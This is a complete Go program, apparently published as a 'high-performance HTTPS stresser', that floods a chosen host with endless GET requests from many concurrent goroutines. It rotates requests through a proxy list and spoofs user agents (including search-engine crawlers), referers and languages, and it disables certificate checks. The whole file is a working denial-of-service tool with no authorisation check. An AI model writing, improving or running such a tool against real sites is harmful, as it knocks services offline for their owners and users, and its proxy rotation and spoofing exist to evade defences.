package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorCyan   = "\033[36m"
	colorReset  = "\033[0m"
)

var (
	ops        uint64
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/117.0.2045.43",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; U; Android 11; en-US; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F936U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/116.0.5845.96 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
		"Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"curl/7.88.1",
		"Wget/1.21.3 (linux-gnu)",
		"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
		"Mozilla/5.0 (PlayStation 5 4.00) AppleWebKit/537.73 (KHTML, like Gecko)",
		"Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.12.8",
		"DoCoMo/2.0 SH902i(c100;TB;W24H12)",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
	}
	proxies  []string
	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://www.facebook.com/",
		"https://twitter.com/",
		"https://www.youtube.com/",
		"https://www.instagram.com/",
		"https://www.reddit.com/",
	}
	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.9",
		"en-US,en;q=0.8,fr;q=0.6",
		"es-ES,es;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
	}
)

func loadProxies(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	if len(proxies) > 0 {
		fmt.Printf(colorGreen+"[+] Loaded %d proxies from %s\n"+colorReset, len(proxies), filename)
	}
}

func attack(target string, port int, wg *sync.WaitGroup, verbosePtr *bool) {
	defer wg.Done()

	// Construct URL
	scheme := "https"
	if port == 80 {
		scheme = "http"
	}
	targetUrl := fmt.Sprintf("%s://%s:%d/", scheme, target, port)

	// High-performance Transport
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        1000,
		MaxIdleConnsPerHost: 1000, // Critical for concurrency
		DisableKeepAlives:   false,
	}

	// If proxies exist, use a custom Proxy function to rotate them per request
	if len(proxies) > 0 {
		transport.Proxy = func(req *http.Request) (*url.URL, error) {
			proxyAddr := proxies[rand.Intn(len(proxies))]
			if !strings.Contains(proxyAddr, "://") {
				proxyAddr = "http://" + proxyAddr
			}
			return url.Parse(proxyAddr)
		}
		// If using proxies, we might want to disable keep-alives to ensure rotation works effectively
		// or keep them if the proxy supports it. For flooding, rotation is usually preferred.
		transport.DisableKeepAlives = true
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	for {
		req, err := http.NewRequest("GET", targetUrl, nil)
		if err != nil {
			continue
		}

		// Random Headers
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
		req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
		req.Header.Set("Referer", referers[rand.Intn(len(referers))])
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Upgrade-Insecure-Requests", "1")

		resp, err := client.Do(req)
		if err != nil {
			if *verbosePtr {
				fmt.Printf(colorRed+"[!] Request failed: %v\n"+colorReset, err)
			}
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		atomic.AddUint64(&ops, 1)
	}
}

func main() {
	targetPtr := flag.String("t", "example.com", "Target Host (No https://)")
	portPtr := flag.Int("p", 443, "Target Port (Default 443 for HTTPS)")
	threadsPtr := flag.Int("th", 100, "Number of Goroutines")
	verbosePtr := flag.Bool("v", false, "Verbose mode (print errors)")
	flag.Parse()

	// Clear screen
	fmt.Print("\033[H\033[2J")

	fmt.Println(colorRed + `
  _  __  ___   _       _       ______   _____  
 | |/ / |_ _| | |     | |     |  ____| |  __ \ 
 | ' /   | |  | |     | |     | |__    | |__) |
 |  <    | |  | |     | |     |  __|   |  _  / 
 | . \  _| |_ | |____ | |____ | |____  | | \ \ 
 |_|\_\|_____||______||______||______| |_|  \_\
                                               ` + colorReset)
	fmt.Println(colorYellow + "      >>> HIGH-PERFORMANCE HTTPS STRESSER <<<" + colorReset)
	fmt.Println(colorYellow + "           >>> CODED BY DOLLARHUNTER <<<" + colorReset)
	fmt.Println()

	if *targetPtr == "example.com" {
		fmt.Println(colorRed + "[!] WARNING: You are targeting example.com. Use -t to specify a target." + colorReset)
	}

	// Load proxies
	loadProxies("proxies.txt")

	fmt.Printf(colorGreen+"[+] Launching HTTPS Flood on %s:%d with %d threads...\n"+colorReset, *targetPtr, *portPtr, *threadsPtr)

	var wg sync.WaitGroup
	for i := 0; i < *threadsPtr; i++ {
		wg.Add(1)
		go attack(*targetPtr, *portPtr, &wg, verbosePtr)
	}

	start := time.Now()
	go func() {
		for {
			time.Sleep(1 * time.Second)
			currentOps := atomic.LoadUint64(&ops)
			elapsed := time.Since(start).Seconds()
			fmt.Printf("\r"+colorCyan+"[+] HTTPS Requests: %d | RPS: %.0f/s"+colorReset, currentOps, float64(currentOps)/elapsed)
		}
	}()

	wg.Wait()
}